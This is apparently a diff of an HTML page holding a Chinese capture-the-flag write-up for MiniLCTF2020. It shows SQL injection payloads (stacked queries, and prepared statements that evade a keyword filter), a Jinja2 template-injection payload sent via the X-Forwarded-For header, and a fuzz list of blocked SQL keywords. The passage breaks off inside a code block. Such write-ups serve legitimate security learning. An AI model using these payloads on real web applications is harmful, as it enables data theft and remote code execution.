@@ -8,17 +8,17 @@
         <title>MiniLCTF2020 Writeup - Leon&#39;s Blog</title><meta name="Description" content="Leon&#39;s Blog-Keep learning web security"><meta property="og:title" content="MiniLCTF2020 Writeup" />
 <meta property="og:description" content="题目质量很不错，平台界面好看又稳定，动态docker启动快" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://clq0.top/minilctf2020-writeup/" />
-<meta property="og:image" content="https://clq0.top/logo_.jpg"/>
+<meta property="og:url" content="https://blog.h4ck.fun/minilctf2020-writeup/" /><meta property="og:image" content="https://blog.h4ck.fun/logo_.jpg"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-05-10T14:46:14+08:00" />
 <meta property="article:modified_time" content="2020-05-10T14:46:14+08:00" />
+
 <meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://clq0.top/logo_.jpg"/>
+<meta name="twitter:image" content="https://blog.h4ck.fun/logo_.jpg"/>
 
 <meta name="twitter:title" content="MiniLCTF2020 Writeup"/>
 <meta name="twitter:description" content="题目质量很不错，平台界面好看又稳定，动态docker启动快"/>
 <meta name="application-name" content="Leon&#39;s Blog">
-<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://clq0.top/minilctf2020-writeup/" /><link rel="prev" href="https://clq0.top/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-writeup/" /><link rel="next" href="https://clq0.top/whuctf2020-writeup/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.h4ck.fun/minilctf2020-writeup/" /><link rel="prev" href="https://blog.h4ck.fun/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-writeup/" /><link rel="next" href="https://blog.h4ck.fun/whuctf2020-writeup/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
@@ -26,11 +26,11 @@
         "inLanguage": "zh-CN",
         "mainEntityOfPage": {
             "@type": "WebPage",
-            "@id": "https:\/\/clq0.top\/minilctf2020-writeup\/"
-        },"genre": "posts","keywords": "unserialize, RCE, SQL注入","wordcount":  6617 ,
-        "url": "https:\/\/clq0.top\/minilctf2020-writeup\/","datePublished": "2020-05-10T14:46:14+08:00","dateModified": "2020-05-10T14:46:14+08:00","publisher": {
+            "@id": "https:\/\/blog.h4ck.fun\/minilctf2020-writeup\/"
+        },"genre": "posts","keywords": "unserialize, RCE, SQL注入","wordcount":  6634 ,
+        "url": "https:\/\/blog.h4ck.fun\/minilctf2020-writeup\/","datePublished": "2020-05-10T14:46:14+08:00","dateModified": "2020-05-10T14:46:14+08:00","publisher": {
             "@type": "Organization",
-            "name": "Leon","logo": "https:\/\/clq0.top\/logo_.jpg"},"author": {
+            "name": "Leon","logo": "https:\/\/blog.h4ck.fun\/logo_.jpg"},"author": {
                 "@type": "Person",
                 "name": "Leon"
             },"description": ""
@@ -104,7 +104,7 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">MiniLCTF2020 Writeup</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="http://clq0.top" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>Leon</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw"></i>Writeup</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-05-10">2020-05-10</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;6617 words&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-05-10">2020-05-10</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;6634 words&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;14 minutes&nbsp;<span id="/minilctf2020-writeup/" class="leancloud_visitors" data-flag-title="MiniLCTF2020 Writeup">
                         <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
                     </span>&nbsp;</div>
@@ -133,12 +133,12 @@
 <p>打开是个注入页面，尝试注入：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="o">-</span><span class="mi">1</span><span class="s1">&#39;) or 1=1 #
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="o">-</span><span class="mi">1</span><span class="s1">&#39;) or 1=1 #
 </span><span class="s1">//爆出所有用户
 </span><span class="s1">//这里用了括号包裹
 </span></code></pre></td></tr></table>
@@ -149,7 +149,7 @@
 <p>尝试堆叠注入，发现可以，payload：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -157,25 +157,25 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">gloucester</span><span class="s1">&#39;);show tables;#
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="n">gloucester</span><span class="s1">&#39;);show tables;#
 </span><span class="s1">//1145141919810  user
 </span><span class="s1">
-</span><span class="s1">gloucester&#39;</span><span class="p">);</span><span class="k">desc</span> <span class="o">`</span><span class="mi">1145141919810</span><span class="o">`#</span>
-<span class="o">//</span><span class="err">没看见字段名，无法改名</span>
-<span class="o">//</span><span class="err">这里前面要输入存在的用户，为什么是</span><span class="n">gloucester</span><span class="err">，可能是名字好看吧</span>
-</code></pre></td></tr></table>
+</span><span class="s1">gloucester&#39;</span><span class="p">);</span><span class="k">desc</span><span class="w"> </span><span class="o">`</span><span class="mi">1145141919810</span><span class="o">`#</span><span class="w">
+</span><span class="w"></span><span class="o">//</span><span class="err">没看见字段名，无法改名</span><span class="w">
+</span><span class="w"></span><span class="o">//</span><span class="err">这里前面要输入存在的用户，为什么是</span><span class="n">gloucester</span><span class="err">，可能是名字好看吧</span><span class="w">
+</span></code></pre></td></tr></table>
 </div>
 </div><p>因为gloucester是个pljj</p>
 <p>select被过滤用预编译：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-text" data-lang="text">set用于设置变量名和值
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">set用于设置变量名和值
 prepare用于预备一个语句，并赋予名称，以后可以引用该语句
 execute执行语句
 deallocate prepare用来释放掉预处理的语句
@@ -184,13 +184,13 @@ deallocate prepare用来释放掉预处理的语句
 </div><p>payload：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">gloucester</span><span class="s1">&#39;);Set @sql = CONCAT(&#39;</span><span class="n">se</span><span class="s1">&#39;,&#39;</span><span class="n">lect</span> <span class="o">*</span> <span class="k">from</span> <span class="o">`</span><span class="mi">1145141919810</span><span class="o">`</span><span class="p">;</span><span class="s1">&#39;);Prepare stmt from @sql;EXECUTE stmt;#
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="n">gloucester</span><span class="s1">&#39;);Set @sql = CONCAT(&#39;</span><span class="n">se</span><span class="s1">&#39;,&#39;</span><span class="n">lect</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="o">`</span><span class="mi">1145141919810</span><span class="o">`</span><span class="p">;</span><span class="s1">&#39;);Prepare stmt from @sql;EXECUTE stmt;#
 </span><span class="s1">//这里Set和Prepare小写时回显hint:strstr
 </span><span class="s1">//想到strstr区分大小写，过滤了小写那么大写即可绕过
 </span><span class="s1">//若要不区分大小写可以换为stristr()函数
@@ -209,7 +209,7 @@ deallocate prepare用来释放掉预处理的语句
 <p>payload：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -222,7 +222,7 @@ deallocate prepare用来释放掉预处理的语句
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-text" data-lang="text">#获取所有类：
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">#获取所有类：
 /?x1=__class__;x2=__base__;x3=__subclasses__
 X-Forwarded-For: {{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()}}
 
@@ -235,8 +235,8 @@ X-Forwarded-For: {{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.a
 X-Forwarded-For:{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(174)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}
 </code></pre></td></tr></table>
 </div>
-</div><p><img class="alignnone size-full wp-image-429" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200509221921.png" alt="" width="1492" height="449" /></p>
-<p><img class="alignnone size-full wp-image-430" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200509221820.png" alt="" width="1234" height="353" /></p>
+</div><img class="alignnone size-full wp-image-429" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200509221921.png" alt="" width="1492" height="449" />
+<img class="alignnone size-full wp-image-430" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200509221820.png" alt="" width="1234" height="353" />
 <p>这里getitem的用法为：<code>__mro__[2]== __mro__.__getitem__(2)</code>这样方便构造</p>
 <p>这里是用的GET传参，将其中的<code>request.args</code>改为<code>request.values</code>则利用POST的方式进行传参</p>
 <p>flag：minil{4326ae13-0106-423d-b9fc-3fc989f84bcf}</p>
@@ -245,7 +245,7 @@ X-Forwarded-For:{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.ar
 <p>sqlfuzz：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -289,57 +289,57 @@ X-Forwarded-For:{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.ar
 </span><span class="lnt">42
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="o">//</span><span class="n">ban</span><span class="p">:</span>
-<span class="mi">1</span>	<span class="p">;</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">5</span>	<span class="k">and</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">6</span>	<span class="k">or</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">7</span>	<span class="k">for</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">17</span>	<span class="n">information</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">21</span>	<span class="n">concat</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">23</span>	<span class="k">order</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">32</span>	<span class="n">oror</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">33</span>	<span class="o">=</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">35</span>	<span class="o">/</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">37</span>	<span class="o">^</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">39</span>	<span class="o">&lt;&gt;</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">43</span>	<span class="cm">/**/</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">47</span>	<span class="p">;</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">48</span>	<span class="n">xor</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">49</span>	<span class="n">regexp</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">53</span>	<span class="n">substr</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">54</span>	<span class="k">if</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">55</span>	<span class="n">hex</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">56</span>	<span class="n">mid</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">57</span>	<span class="nb">char</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">59</span>	<span class="n">updatexml</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">60</span>	<span class="n">extractvalue</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">61</span>	<span class="n">secpulse</span><span class="s1">&#39;=&#39;</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">62</span>	<span class="k">update</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">63</span>	<span class="k">insert</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">65</span>	<span class="n">concat</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">68</span>	<span class="n">sleep</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">69</span>	<span class="n">ascii</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">70</span>	<span class="n">bin</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">71</span>	<span class="n">floor</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">72</span>	<span class="p">,</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">74</span>	<span class="k">substring</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">75</span>	<span class="n">group_concat</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">77</span>	<span class="n">BENCHMARK</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">78</span>	<span class="n">ord</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">82</span>	<span class="n">password</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">84</span>	<span class="o">?</span><span class="err">\</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">85</span>	<span class="n">concat_ws</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">93</span>	<span class="n">rand</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>	
-<span class="mi">95</span>	<span class="n">load_file</span>	<span class="mi">200</span>	<span class="k">false</span>	<span class="k">false</span>	<span class="mi">1946</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="o">//</span><span class="n">ban</span><span class="p">:</span><span class="w">
+</span><span class="w"></span><span class="mi">1</span><span class="w">	</span><span class="p">;</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">5</span><span class="w">	</span><span class="k">and</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">6</span><span class="w">	</span><span class="k">or</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">7</span><span class="w">	</span><span class="k">for</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">17</span><span class="w">	</span><span class="n">information</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">21</span><span class="w">	</span><span class="n">concat</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">23</span><span class="w">	</span><span class="k">order</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">32</span><span class="w">	</span><span class="n">oror</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">33</span><span class="w">	</span><span class="o">=</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">35</span><span class="w">	</span><span class="o">/</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">37</span><span class="w">	</span><span class="o">^</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">39</span><span class="w">	</span><span class="o">&lt;&gt;</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">43</span><span class="w">	</span><span class="cm">/**/</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">47</span><span class="w">	</span><span class="p">;</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">48</span><span class="w">	</span><span class="n">xor</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">49</span><span class="w">	</span><span class="n">regexp</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">53</span><span class="w">	</span><span class="n">substr</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">54</span><span class="w">	</span><span class="k">if</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">55</span><span class="w">	</span><span class="n">hex</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">56</span><span class="w">	</span><span class="n">mid</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">57</span><span class="w">	</span><span class="nb">char</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">59</span><span class="w">	</span><span class="n">updatexml</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">60</span><span class="w">	</span><span class="n">extractvalue</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">61</span><span class="w">	</span><span class="n">secpulse</span><span class="s1">&#39;=&#39;</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">62</span><span class="w">	</span><span class="k">update</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">63</span><span class="w">	</span><span class="k">insert</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">65</span><span class="w">	</span><span class="n">concat</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">68</span><span class="w">	</span><span class="n">sleep</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">69</span><span class="w">	</span><span class="n">ascii</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">70</span><span class="w">	</span><span class="n">bin</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">71</span><span class="w">	</span><span class="n">floor</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">72</span><span class="w">	</span><span class="p">,</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">74</span><span class="w">	</span><span class="k">substring</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">75</span><span class="w">	</span><span class="n">group_concat</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">77</span><span class="w">	</span><span class="n">BENCHMARK</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">78</span><span class="w">	</span><span class="n">ord</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">82</span><span class="w">	</span><span class="n">password</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">84</span><span class="w">	</span><span class="o">?</span><span class="err">\</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">85</span><span class="w">	</span><span class="n">concat_ws</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">93</span><span class="w">	</span><span class="n">rand</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">	
+</span><span class="w"></span><span class="mi">95</span><span class="w">	</span><span class="n">load_file</span><span class="w">	</span><span class="mi">200</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="k">false</span><span class="w">	</span><span class="mi">1946</span><span class="w">
+</span></code></pre></td></tr></table>
 </div>
 </div><p>看起来过滤了很多，还好select和union没被ban，还有limit可以用</p>
-<p>主要是逗号被ban了需要绕过：参考：<a href="https://clq0.top/2020/04/x1ct34m考核题笔记/#i-3"><a href="http://blog.clq0.top/2020/04/x1ct34m">http://blog.clq0.top/2020/04/x1ct34m</a>考核题笔记/#i-3</a></p>
+<p>主要是逗号被ban了需要绕过：参考：<a href="https://clq0.top/2020/04/x1ct34m考核题笔记/#i-3"><a href="http://blog.clq0.top/2020/04/x1ct34m" target="_blank" rel="noopener noreffer">http://blog.clq0.top/2020/04/x1ct34m</a>考核题笔记/#i-3</a></p>
 <p>这题问了出题人，预期解是逗号绕过和无列名注入</p>
 <p>预期解：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
